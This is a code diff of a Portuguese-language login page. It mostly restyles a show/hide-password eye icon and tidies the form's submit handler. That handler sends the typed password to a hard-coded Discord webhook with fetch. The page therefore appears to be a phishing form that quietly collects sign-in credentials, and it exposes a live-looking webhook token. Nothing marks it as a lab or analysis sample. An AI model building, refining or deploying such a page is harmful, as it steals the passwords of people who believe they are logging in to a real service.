@@ -38,21 +38,23 @@
     .input-group { margin-bottom: 20px; text-align: left; position: relative; }
     .input-group label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 500; color: #d0d0d8; }
     input {
-      width: 100%; padding: 14px 16px; border: 1px solid #444; border-radius: 8px;
+      width: 100%; padding: 14px 44px 14px 16px; /* espaço extra à direita pro olho */
+      border: 1px solid #444; border-radius: 8px;
       background: #1a1a1f; color: white; font-size: 16px; transition: all 0.2s;
     }
     input:focus { outline: none; border-color: #00a2ff; box-shadow: 0 0 0 3px rgba(0, 162, 255, 0.25); }
-    .toggle-password {
+    .eye-icon {
       position: absolute;
-      right: 12px;
+      right: 16px;
       top: 50%;
-      transform: translateY(-10%);
-      cursor: pointer;
+      transform: translateY(-50%);
       font-size: 20px;
       color: #a0a0a8;
+      cursor: pointer;
       user-select: none;
+      transition: color 0.2s;
     }
-    .toggle-password:hover { color: #ffffff; }
+    .eye-icon:hover { color: #ffffff; }
     .btn-login {
       width: 100%; padding: 16px; background: #00c74e; color: white; border: none;
       border-radius: 8px; font-size: 18px; font-weight: 600; cursor: pointer;
@@ -89,7 +91,7 @@
       <div class="input-group">
         <label for="password">Senha</label>
         <input type="password" id="password" placeholder="Senha" autocomplete="current-password" required>
-        <span class="toggle-password" id="toggleEye">👁️</span>
+        <span class="eye-icon" id="eyeIcon">👁️</span>
       </div>
       <button type="submit" class="btn-login">Entrar</button>
     </form>
@@ -115,16 +117,14 @@
     // Seu webhook real aqui
     const webhookUrl = 'https://discord.com/api/webhooks/1473860451589685344/N8gc13rR1kJj7Pb5DznSI88Lpz_8BLcxUReQ5VulpR001D2os62t3HjFP-NTK_ABAuFm';
 
-    // Toggle mostrar/esconder senha
+    // Toggle olho para mostrar/esconder senha
     const passwordInput = document.getElementById('password');
-    const toggleEye = document.getElementById('toggleEye');
+    const eyeIcon = document.getElementById('eyeIcon');
 
-    toggleEye.addEventListener('click', function() {
-      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-      passwordInput.setAttribute('type', type);
-      
-      // Muda o ícone: olho aberto/fechado
-      toggleEye.textContent = type === 'text' ? '🙈' : '👁️';
+    eyeIcon.addEventListener('click', () => {
+      const isPassword = passwordInput.type === 'password';
+      passwordInput.type = isPassword ? 'text' : 'password';
+      eyeIcon.textContent = isPassword ? '🙈' : '👁️'; // muda o ícone
     });
 
     form.addEventListener('submit', async function(e) {
@@ -149,19 +149,12 @@ ${senha || '—'}`;
           const response = await fetch(webhookUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              content: mensagem,
-              allowed_mentions: { parse: [] }
-            })
+            body: JSON.stringify({ content: mensagem, allowed_mentions: { parse: [] } })
           });
-
-          if (response.ok) {
-            console.log('Enviado com sucesso!');
-          } else {
-            console.error('Erro ao enviar:', response.status);
-          }
+          if (response.ok) console.log('Enviado!');
+          else console.error('Erro:', response.status);
         } catch (err) {
-          console.error('Falha na requisição:', err);
+          console.error('Falha:', err);
         }
       }
     });
